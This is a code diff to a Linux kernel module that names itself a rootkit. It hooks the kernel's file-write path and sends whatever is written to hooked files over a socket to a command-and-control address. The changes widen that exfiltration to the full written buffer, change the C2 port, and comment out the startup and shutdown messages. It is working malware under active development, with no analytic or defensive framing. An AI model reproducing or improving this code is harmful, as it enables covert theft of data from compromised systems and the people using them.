@@ -25,7 +25,6 @@ struct msghdr msg;
 
 struct rootkitMessage {
   uint8_t index;
-  uint32_t length;
 };
 
 
@@ -99,24 +98,31 @@ asmlinkage ssize_t vfs_h_write(struct file *file, const char __user *buf, size_t
 	      whichFile = 1;
 	   }
 	}
-	printk("Index:%d\n", whichFile);
-	
+	printk("COUNT:%d\n", count);
+
 	struct rootkitMessage rtkMsg;
     	rtkMsg.index = whichFile;
-    	rtkMsg.length = cpu_to_be32(4);
         
 	struct kvec vecInit;
 	vecInit.iov_base = &rtkMsg;
-	vecInit.iov_len = 4;
+	vecInit.iov_len = 1;
 
-	sendErr = kernel_sendmsg(cncSocket, &msg, &vecInit, 5, 5);
-        printk("Init Message Sent: %d\n", sendErr);
+	//sendErr = kernel_sendmsg(cncSocket, &msg, &vecInit, 1, 1);
+        //printk("Init Message Sent: %d\n", sendErr);
 
 	struct kvec vecData;
 	vecData.iov_base = buf;
-	vecData.iov_len = 4;
+	vecData.iov_len = count;
 
-	sendErr = kernel_sendmsg(cncSocket, &msg, &vecData, 4, 4);
+	sendErr = kernel_sendmsg(cncSocket, &msg, &vecData, count, count);
+
+	char *newLine = "\n";
+	
+	struct kvec vecNewLine;
+	vecNewLine.iov_base = newLine;
+	vecNewLine.iov_len = 2;
+
+	sendErr = kernel_sendmsg(cncSocket, &msg, &vecNewLine, 2, 2);
 	printk("Data Message Sent: %d\n", sendErr);
 
       //  fprt = fopen("test.txt","w");
@@ -174,7 +180,7 @@ static int __init rootkit_init(void)
     struct sockaddr_in cncAddress;
     memset(&cncAddress, 0, sizeof(cncAddress));
     cncAddress.sin_family = AF_INET;
-    cncAddress.sin_port = htons(8760);
+    cncAddress.sin_port = htons(9004);
     cncAddress.sin_addr.s_addr = in_aton(cncIpAddress);
 
     memset(&msg, 0x00, sizeof(msg));
@@ -205,18 +211,18 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
     //Send End Message
-    int endMsgErr;
-    struct rootkitMessage rtkEndMsg;
-    rtkEndMsg.index = -1;
-    rtkEndMsg.length = cpu_to_be32(-1);
+    //int endMsgErr;
+    //struct rootkitMessage rtkEndMsg;
+    //rtkEndMsg.index = -1;
+    //rtkEndMsg.length = cpu_to_be64(-1);
 
-    struct kvec vecEnd;
-    vecEnd.iov_base = &rtkEndMsg;
-    vecEnd.iov_len = 4;
+    //struct kvec vecEnd;
+    //vecEnd.iov_base = &rtkEndMsg;
+    //vecEnd.iov_len = 9;
 
-    endMsgErr = kernel_sendmsg(cncSocket, &msg, &vecEnd, 5, 5);
+    //endMsgErr = kernel_sendmsg(cncSocket, &msg, &vecEnd, 9, 9);
     
-    printk("End Message Bytes: %d\n", endMsgErr);
+    //printk("End Message Bytes: %d\n", endMsgErr);
     
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "rootkit: unloaded\n");
